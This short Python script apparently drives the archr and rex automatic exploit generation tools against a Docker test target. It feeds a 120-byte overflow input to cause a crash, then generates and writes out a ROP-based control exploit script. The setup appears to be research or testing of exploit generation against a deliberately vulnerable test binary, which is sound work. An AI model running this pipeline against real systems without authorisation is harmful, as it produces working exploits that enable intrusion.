import os
import archr
import rex

t = archr.targets.DockerImageTarget('rex_tests:hammer_controller').build().start()
tb = archr.arsenal.RRTracerBow(t, local_trace_dir='/tmp/rex_hammer_controller_trace', symbolic_fd=0)

import logging
logging.getLogger("angr.exploration_techniques.tracer").setLevel(logging.DEBUG)

crash = rex.Crash(t, b"\x41"*120 + b'\n', aslr=False, tracer_bow=tb)

exploit = crash.exploit()
exploit.arsenal['rop_chess_control'].script()
exploit.arsenal['rop_chess_control'].script("x2.py")
